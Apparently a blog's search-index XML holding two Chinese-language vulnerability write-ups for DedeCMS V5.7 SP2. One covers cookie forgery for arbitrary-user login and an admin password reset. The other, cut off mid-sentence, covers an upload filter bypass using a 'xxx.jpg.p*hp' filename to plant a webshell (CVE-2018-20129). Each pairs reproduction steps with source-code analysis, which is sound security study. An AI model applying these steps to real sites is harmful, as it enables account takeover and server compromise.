<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DedecmsV5.7 SP2 任意用户登录</title>
      <link href="2021/07/02/DedecmsV5-7-SP2-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"/>
      <url>2021/07/02/DedecmsV5-7-SP2-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>织梦内容管理系统(Dedecms)是一款PHP开源网站管理系统。dedecms 的会员模块的身份认证使用的是客户端 session，在 Cookie 中写入用户 ID 并且附上 ID__ckMd5，用做签名。主页存在逻辑漏洞，导致可以返回指定 uid 的 ID 的 Md5 散列值。原理上可以伪造任意用户登录。</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>DedeCMS V5.7 SP2</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先需要有一个用户，注册一个即可，但是注册的用户名不能随便，对应了想要登录用户的 <code>id</code> ，然后需要管理员审核通过，不然没法访问空间，无法进行攻击</p><p>比如这里，我注册的用户名是 <code>0000001</code> ，对应的是 <code>admin</code> 的 <code>id</code> ，登陆后访问链接并抓包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dedecms521.com&#x2F;member&#x2F;index.php?uid&#x3D;0000001</span><br></pre></td></tr></table></figure><p>这里需要注意，要把  <code>cookie</code> 中的带 <code>last_</code> 的部分删掉，不然不会生成新的 <code>cookie</code> ，参数 <code>uid</code> 对应的是这个用户名</p><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210704180301.png"></p><p>将 <code>cookie</code> 中的 <code>DedeUserID</code> 设置为这里得到的 <code>cookie</code> 中的 <code>last_vid</code> ，<code>DedeUserID__ckMd5</code> 设置为这里得到的 <code>cookie</code> 中的 <code>last_vid</code>，再访问链接，即可发现成功访问到了另外的用户，这里是 <code>admin</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dedecms521.com&#x2F;member&#x2F;index.php</span><br></pre></td></tr></table></figure><p><img src="G:\我的笔记\blog\source_posts\DedecmsV5-7-SP2-任意用户登录.assets\image-20210704180648323.png" alt="image-20210704180648323"></p><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><h3 id="获取-last-vid"><a href="#获取-last-vid" class="headerlink" title="获取 last_vid"></a>获取 last_vid</h3><p>根据上面我们先定位到 <code>member/index.php</code> ，先看复现的第一部分，带 <code>uid</code> 参数访问时，如何设置的 <code>cookie</code></p><p>带有 <code>uid</code> 并且 <code>action</code> 为空时，我们会来到 133 行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="variable">$last_vtime</span> = GetCookie(<span class="string">&#x27;last_vtime&#x27;</span>);</span><br><span class="line"><span class="variable">$last_vid</span> = GetCookie(<span class="string">&#x27;last_vid&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$last_vtime</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$last_vtime</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$vtime</span> - <span class="variable">$last_vtime</span> &gt; <span class="number">3600</span> || !preg_match(<span class="string">&#x27;#,&#x27;</span>.<span class="variable">$uid</span>.<span class="string">&#x27;,#i&#x27;</span>, <span class="string">&#x27;,&#x27;</span>.<span class="variable">$last_vid</span>.<span class="string">&#x27;,&#x27;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$last_vid</span>!=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$last_vid</span> = <span class="variable">$uid</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    PutCookie(<span class="string">&#x27;last_vtime&#x27;</span>, <span class="variable">$vtime</span>, <span class="number">3600</span>*<span class="number">24</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    PutCookie(<span class="string">&#x27;last_vid&#x27;</span>, <span class="variable">$last_vid</span>, <span class="number">3600</span>*<span class="number">24</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>首先是一个 <code>GetCookie</code> 方法，顾名思义是获取 <code>cookie</code> ，进入这个方法 <code>include/helpers/cookie.helper.php</code> 56 行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetCookie</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$cfg_cookie_encode</span>;</span><br><span class="line">    <span class="keyword">if</span>( !<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="variable">$key</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="variable">$key</span>.<span class="string">&#x27;__ckMd5&#x27;</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="variable">$key</span>.<span class="string">&#x27;__ckMd5&#x27;</span>]!=substr(md5(<span class="variable">$cfg_cookie_encode</span>.<span class="variable">$_COOKIE</span>[<span class="variable">$key</span>]),<span class="number">0</span>,<span class="number">16</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这里会判断是否有这个 <code>$key</code> 以及 <code>$key . __ckMd5</code> ，然后 <code>md5</code> 比较，实际上是为了验证 <code>cookie</code> 是否是伪造的，这里用了一个盐 <code>$cfg_cookie_encode</code> ，我们知道这个盐的值的时候才可以实现伪造</p><p>由于没有设置这两个 <code>cookie</code> ，直接置空，就会进入 <code>if</code> 语句，然后 <code>$last_vid</code> 等于空，就会执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$last_vid</span> = <span class="variable">$uid</span>;</span><br></pre></td></tr></table></figure><p>然后使用 <code>PutCookie</code> 设置 <code>cookie</code> ，我们来看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">PutCookie</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$kptime</span>=<span class="number">0</span>, <span class="variable">$pa</span>=<span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$cfg_cookie_encode</span>,<span class="variable">$cfg_domain_cookie</span>;</span><br><span class="line">    setcookie(<span class="variable">$key</span>, <span class="variable">$value</span>, time()+<span class="variable">$kptime</span>, <span class="variable">$pa</span>,<span class="variable">$cfg_domain_cookie</span>);</span><br><span class="line">    setcookie(<span class="variable">$key</span>.<span class="string">&#x27;__ckMd5&#x27;</span>, substr(md5(<span class="variable">$cfg_cookie_encode</span>.<span class="variable">$value</span>),<span class="number">0</span>,<span class="number">16</span>), time()+<span class="variable">$kptime</span>, <span class="variable">$pa</span>,<span class="variable">$cfg_domain_cookie</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h3><p>接下来看看复现的第二部分，设置了 <code>cookie</code> 之后，如何绕过的权限</p><p>依旧是 <code>member/index.php</code>，不过没有带参数 <code>uid</code>，不带有 <code>uid</code> 的是进入会员后台，我们看看是怎么认证的，主要看到 28 行，这个是判断有没有登录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cfg_ml</span>-&gt;IsLogin()</span><br></pre></td></tr></table></figure><p>跟进看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">IsLogin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;M_ID &gt; <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码很简单，只要满足 <code>$this-&gt;M_ID</code> 大于 0 就可以，但是这个 <code>$this-&gt;M_ID</code> 是哪里设置的呢，我们往前看，发现在一开始会包含一个 <code>member/config.php</code> ，我们跟进去看看，在 103 行发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cfg_ml</span> = <span class="keyword">new</span> MemberLogin(<span class="variable">$keeptime</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断用户是否登录</span></span><br><span class="line"><span class="variable">$myurl</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$cfg_ml</span>-&gt;IsLogin())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$myurl</span> = <span class="variable">$cfg_memberurl</span>.<span class="string">&quot;/index.php?uid=&quot;</span>.urlencode(<span class="variable">$cfg_ml</span>-&gt;M_LoginID);</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;#^http:#i&quot;</span>, <span class="variable">$myurl</span>)) <span class="variable">$myurl</span> = <span class="variable">$cfg_basehost</span>.<span class="variable">$myurl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里就会判断用户是否登录了，我们看看 <code>MemberLogin</code> 类的初始化 <code>include/memberlogin.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$kptime</span> = -<span class="number">1</span>, <span class="variable">$cache</span>=<span class="literal">FALSE</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$dsql</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$kptime</span>==-<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;M_KeepTime = <span class="number">3600</span> * <span class="number">24</span> * <span class="number">7</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;M_KeepTime = <span class="variable">$kptime</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$formcache</span> = <span class="literal">FALSE</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;M_ID = <span class="keyword">$this</span>-&gt;GetNum(GetCookie(<span class="string">&quot;DedeUserID&quot;</span>));</span><br><span class="line">    <span class="keyword">$this</span>-&gt;M_LoginTime = GetCookie(<span class="string">&quot;DedeLoginTime&quot;</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;fields = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;isAdmin = <span class="literal">FALSE</span>;</span><br></pre></td></tr></table></figure><p>可以看到，这里设置了 <code>$this-&gt;M_ID</code> ，而这个值是从 <code>cookie</code> 中的 <code>DedeUserID</code> 中取的，然后执行 <code>$this-&gt;GetNum</code> 方法，看看这个方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetNum</span>(<span class="params"><span class="variable">$fnum</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$fnum</span> = preg_replace(<span class="string">&quot;/[^0-9\.]/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$fnum</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$fnum</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是只能是数字和点，之后的认证全部由这个 <code>$this-&gt;M_ID</code> 值得到，看后面的 <code>sql</code> 语句可以知道，这个值对应的是数据库中的 <code>mid</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;fields = <span class="variable">$dsql</span>-&gt;GetOne(<span class="string">&quot;Select * From `#@__member` where mid=&#x27;<span class="subst">&#123;$this-&gt;M_ID&#125;</span>&#x27; &quot;</span>);</span><br></pre></td></tr></table></figure><p>我们只要能伪造这个值，那么就可以造成任意用户登录，伪造这个值简单，但是前面提到了 <code>GetCookie</code> 中有一个认证，得到这个值的同时，会检查 <code>$key.&#39;__ckMd5&#39;</code> 值的内容，这是 <code>$this-&gt;M_ID</code> 加盐后的 <code>md5</code> 截取的，我们要伪造就需要同时伪造对应的这两个值，因为是用的同一套加密，同一个盐，所以前面获取的 <code>last_vid</code> 与其对应的 <code>last_vid__ckMd5</code> 刚好可以满足这一点要求，所以只要伪造这个 <code>last_vid</code> 就可以实现</p><p>而 <code>last_vid</code> 的值由 <code>uid</code> 控制，也就是用户名控制，所以我们注册用户名的时候控制就可以，但是存在一个问题，用户名的注册长度是存在限制的，关于这点可以看到 <code>member/reg_new.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$userid</span>) &lt; <span class="variable">$cfg_mb_idmin</span> || strlen(<span class="variable">$pwd</span>) &lt; <span class="variable">$cfg_mb_pwdmin</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(<span class="string">&quot;你的用户名或密码过短，不允许注册！&quot;</span>,<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认最小用户名长度为 3，难道说我们至少要注册 <code>mid &gt; 99</code> 的账号么 ？实则不用</p><p>我们可以注册用户名 <code>00001</code> ，自然，获取 <code>uid=00001</code> ，然后将其获取到的 ``last_vid<code> </code> 与 <code> </code>last_vid__ckMd5<code> 设置到</code>cookie<code> 中的</code>DedeUserID<code>与 </code>DedeUserID__ckMd5<code>，然后来到</code>memberlogin` ，这里按照上面提到过的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;M_ID = <span class="keyword">$this</span>-&gt;GetNum(GetCookie(<span class="string">&quot;DedeUserID&quot;</span>));</span><br></pre></td></tr></table></figure><p><code>00001</code> 满足 <code>GetNum</code> 的要求，所以此时获取到的 <code>$this-&gt;M_ID</code> 就为 <code>00001</code> ，继续向下走就会来到 <code>include/memberlogin.class.php</code> 的 178 行，这里进行了一个取整的操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;M_ID = intval(<span class="keyword">$this</span>-&gt;M_ID);</span><br></pre></td></tr></table></figure><p>经过出来后的 <code>$this-&gt;M_ID</code> 就变成了 <code>1</code>，然后再继续下面的操作就会得到我们想要的数据</p><h3 id="关于是否可以不用注册特殊用户名用户"><a href="#关于是否可以不用注册特殊用户名用户" class="headerlink" title="关于是否可以不用注册特殊用户名用户"></a>关于是否可以不用注册特殊用户名用户</h3><p>此外，可能会有朋友有疑问，可不可以直接访问这个 <code>uid=1</code> ，而不需要这个存在的用户</p><p><code>member/index.php</code> 124 行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(DEDEMEMBER.<span class="string">&#x27;/inc/config_space.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p> 进入后来到 29 行，进入 <code>member/inc/config_space.php</code> 的 <code>GetUserSpaceInfos</code></p><p>这里存在认证，所以没法直接访问</p><h3 id="修改-admin-的密码"><a href="#修改-admin-的密码" class="headerlink" title="修改 admin 的密码"></a>修改 admin 的密码</h3><p>依靠上面的漏洞进入 <code>admin</code> 的个人空间之后，我们可以修改密码，进入链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;member&#x2F;edit_baseinfo.php</span><br></pre></td></tr></table></figure><p>我们看到，可以修改管理员密码，但是需要输入原密码，我们看看代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pwd2</span>=(<span class="keyword">empty</span>(<span class="variable">$pwd2</span>))? <span class="string">&quot;&quot;</span> : <span class="variable">$pwd2</span>;</span><br><span class="line"><span class="variable">$row</span>=<span class="variable">$dsql</span>-&gt;GetOne(<span class="string">&quot;SELECT  * FROM `#@__member` WHERE mid=&#x27;&quot;</span>.<span class="variable">$cfg_ml</span>-&gt;M_ID.<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$face</span> = <span class="variable">$row</span>[<span class="string">&#x27;face&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$dopost</span>==<span class="string">&#x27;save&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span>(!is_array(<span class="variable">$row</span>) || <span class="variable">$row</span>[<span class="string">&#x27;pwd&#x27;</span>] != md5(<span class="variable">$oldpwd</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">&#x27;你输入的旧密码错误或没填写，不允许修改资料！&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$pwd</span> = md5(<span class="variable">$userpwd</span>);</span><br><span class="line">        <span class="variable">$pwd2</span> = substr(md5(<span class="variable">$userpwd</span>),<span class="number">5</span>,<span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$query1</span> = <span class="string">&quot;UPDATE `#@__member` SET pwd=&#x27;<span class="subst">$pwd</span>&#x27;,sex=&#x27;<span class="subst">$sex</span>&#x27;<span class="subst">&#123;$addupquery&#125;</span> where mid=&#x27;&quot;</span>.<span class="variable">$cfg_ml</span>-&gt;M_ID.<span class="string">&quot;&#x27; &quot;</span>;</span><br><span class="line">    <span class="variable">$dsql</span>-&gt;ExecuteNoneQuery(<span class="variable">$query1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果是管理员，修改其后台密码</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$cfg_ml</span>-&gt;fields[<span class="string">&#x27;matt&#x27;</span>]==<span class="number">10</span> &amp;&amp; <span class="variable">$pwd2</span>!=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$query2</span> = <span class="string">&quot;UPDATE `#@__admin` SET pwd=&#x27;<span class="subst">$pwd2</span>&#x27; where id=&#x27;&quot;</span>.<span class="variable">$cfg_ml</span>-&gt;M_ID.<span class="string">&quot;&#x27; &quot;</span>;</span><br><span class="line">        <span class="variable">$dsql</span>-&gt;ExecuteNoneQuery(<span class="variable">$query2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>看代码还是很容易懂得，这里得原密码，比较的是 <code>member</code> 中的密码，而这个密码我们是可以利用之前的漏洞修改的，也就是这个密码我们是可以知道的，然后可以重置 <code>member</code> 与 <code>admin</code> 两张表中的密码，因此可以进入后台。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个漏洞的主要是伪造 <code>cookie</code> ，这里的 <code>cookie</code> 存在验证，可以利用另外会被设置成 <code>cookie</code> 的值来伪造，最后使用到 <code>intval</code> ，由于用户名最少需要 3 位，所以伪造的时候只能伪造成 <code>0001</code> 等形式，巧妙使用 <code>intval</code> 来还原了这个数值，虽然只能伪造到 <code>member</code> 表中的 <code>admin</code> ，但是结合之前的漏洞可以实现进入后台。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/">https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/</a></p></li><li><p><a href="https://www.seebug.org/vuldb/ssvid-97087">https://www.seebug.org/vuldb/ssvid-97087</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> dedecms </tag>
            
            <tag> 任意用户登录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DedecmsV5.7 SP2 前台文件上传漏洞（CVE-2018-20129）</title>
      <link href="2021/07/02/DedecmsV5-7-SP2-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20129%EF%BC%89/"/>
      <url>2021/07/02/DedecmsV5-7-SP2-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20129%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>织梦内容管理系统(Dedecms)是一款PHP开源网站管理系统。Dedecms V5.7 SP2版本中正常用户登录后，前台发表文章可上传绕过 <code>getshell</code></p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>DedeCMS V5.7 SP2</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先需要有一个用户，注册一个即可，然后需要管理员审核通过，不然不能发表文章，变成正常用户后可以发表文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内容用户 -&gt; 发表文章</span><br></pre></td></tr></table></figure><p>详细内容中的富文本编辑器上传图片，<code>burp</code> 抓包后修改如图</p><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210702211118.png"></p><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>根据上传的链接，我们直接定位到 <code>include/dialog/select_images_post.php</code></p><p>一直往下走，来到处理上传文件的位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$CKEditorFuncNum</span> = (<span class="keyword">isset</span>(<span class="variable">$CKEditorFuncNum</span>))? <span class="variable">$CKEditorFuncNum</span> : <span class="number">1</span>;</span><br><span class="line"><span class="variable">$imgfile_name</span> = trim(preg_replace(<span class="string">&quot;#[ \r\n\t\*\%\\\/\?&gt;&lt;\|\&quot;:]&#123;1,&#125;#&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$imgfile_name</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;#\.(&quot;</span>.<span class="variable">$cfg_imgtype</span>.<span class="string">&quot;)#i&quot;</span>, <span class="variable">$imgfile_name</span>))</span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(<span class="string">&quot;你所上传的图片类型不在许可列表，请更改系统对扩展名限定的配置！&quot;</span>, <span class="string">&quot;-1&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$nowtme</span> = time();</span><br></pre></td></tr></table></figure><p>首先是将一些比较特殊的字符给替换成空，这里会将我们传进去的 <code>xxx.jpg.p*hp</code> 变成 <code>xx.jpg.php</code>，然后会判断 <code>$imgfile_name</code> 中有没有 <code>.jpg|.gif|.png</code> ，如果没有那么就不允许，这里话，我们可以以 <code>xxx.jpg.php</code> 绕过，他这里只说需要有这三个中的一个，并没有说要让他们结尾，因此可以被绕过</p><p>继续往下看，这里就判断了文件类型，这个好绕过，然后看这段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename_name</span> = <span class="variable">$cuserLogin</span>-&gt;getUserID().<span class="string">&#x27;-&#x27;</span>.dd2char(MyDate(<span class="string">&quot;ymdHis&quot;</span>, <span class="variable">$nowtme</span>).mt_rand(<span class="number">100</span>,<span class="number">999</span>));</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$mdir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$filename_name</span>;</span><br><span class="line"><span class="variable">$fs</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$imgfile_name</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$filename</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$fs</span>[count(<span class="variable">$fs</span>)-<span class="number">1</span>];</span><br><span class="line"><span class="variable">$filename_name</span> = <span class="variable">$filename_name</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$fs</span>[count(<span class="variable">$fs</span>)-<span class="number">1</span>];</span><br><span class="line"><span class="variable">$fullfilename</span> = <span class="variable">$cfg_basedir</span>.<span class="variable">$activepath</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br></pre></td></tr></table></figure><p>先生成了一串随机字符，然后把我们传进来并被处理过的 <code>$imgfile_name</code> 截取了最后一个点后面的后缀，这里刚好就取到了 <code>php</code> ，然后就生成了最后的 <code>webshell</code> 位置</p><p>可能有同学会奇怪，按照这个流程，那我们传进去的文件名也可以是这样啊 <code>xxx.jpg.php</code> 